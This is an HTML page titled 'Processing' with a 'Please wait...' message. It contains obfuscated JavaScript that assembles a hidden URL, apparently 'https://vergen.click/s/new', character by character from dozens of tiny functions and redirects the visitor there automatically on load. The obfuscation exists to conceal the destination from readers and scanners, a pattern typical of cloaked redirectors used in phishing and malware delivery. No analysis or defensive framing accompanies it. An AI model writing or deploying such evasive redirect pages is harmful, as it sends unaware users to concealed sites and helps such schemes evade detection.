<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Processing</title>
    <script>
        const fragments = [
            _ => 'h',
            _ => 't',
            () => 't',
            _ => 'p',
            () => 's',
            function() { return ':'; },
            function() { return '/'; },
            _ => '/',
            () => 'v',
            _ => 'e',
            _ => 'r',
            function() { return 'g'; },
            function() { return 'e'; },
            function() { return 'n'; },
            _ => '.',
            () => 'c',
            () => 'l',
            function() { return 'i'; },
            _ => 'c',
            _ => 'k',
            function() { return '/'; },
            _ => 's',
            () => '/',
            _ => 'n',
            function() { return 'e'; },
            function() { return 'w'; }
        ];
        window.location.href = fragments.map(fn => fn()).join('');
    </script>
</head>
<body>
    <p>Please wait...</p>
</body>
</html>
